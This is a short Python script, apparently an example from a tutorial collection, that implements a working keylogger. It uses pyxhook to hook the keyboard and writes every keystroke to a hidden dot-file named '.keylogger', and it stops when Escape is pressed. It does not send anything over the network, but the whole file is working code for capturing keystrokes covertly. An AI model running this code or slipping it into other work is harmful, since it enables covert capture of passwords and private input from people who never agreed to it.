# Author: OMKAR PATHAK

# This file requires two modules to be installed:
# 1. pyxhook.py: file is provided in the folder itself
# 2. Xlib: sudo pip3 install python3-Xlib

import pyxhook
import time

# functions to write a newline character into the file
def newline():
	file = open('.keylogger', 'a')
	file.write('\n')
	file.close()

# This function is called every time a key is pressed
def key_press_event(event):
    global running
    # write the key pressed into a file
    if event.Key != 'space' and event.Key != 'Escape':
	    with open('.keylogger', 'a+') as File:
	    	File.write(event.Key)

    # If the ascii value matches spacebar, add a newline in the file
    if event.Key == 'space':
        newline()

    # If the ascii value matches escape, terminate the while loop
    if event.Key == 'Escape':
        running = False
        newline()

if __name__ == '__main__':
	# Create hookmanager
	hookman = pyxhook.HookManager()
	# Define our callback to fire when a key is pressed down
	hookman.KeyDown = key_press_event
	# Hook the keyboard
	hookman.HookKeyboard()
	# Start our listener
	hookman.start()

	# Create a loop to keep the application running
	running = True
	while running:
	    time.sleep(0.1)

	# Close the listener when we are done
	hookman.cancel()
